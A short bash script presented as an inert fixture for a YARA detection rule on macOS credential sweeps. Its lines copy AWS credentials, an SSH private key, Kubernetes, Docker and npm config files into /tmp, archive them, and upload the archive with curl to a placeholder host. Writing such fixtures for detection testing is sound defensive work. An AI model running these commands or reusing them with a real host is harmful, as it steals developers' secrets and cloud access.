#!/bin/bash
# Inert YARA fixture for CERBER_MacOS_Credential_File_Sweep - text only, not a working sample.
mkdir /tmp/c
cp ~/.aws/credentials /tmp/c/
cp ~/.ssh/id_rsa /tmp/c/
cp ~/.kube/config /tmp/c/
cp ~/.docker/config.json /tmp/c/
cp ~/.npmrc /tmp/c/
tar czf /tmp/c.tgz -C /tmp c
curl -s -F "f=@/tmp/c.tgz" http://example.invalid/up
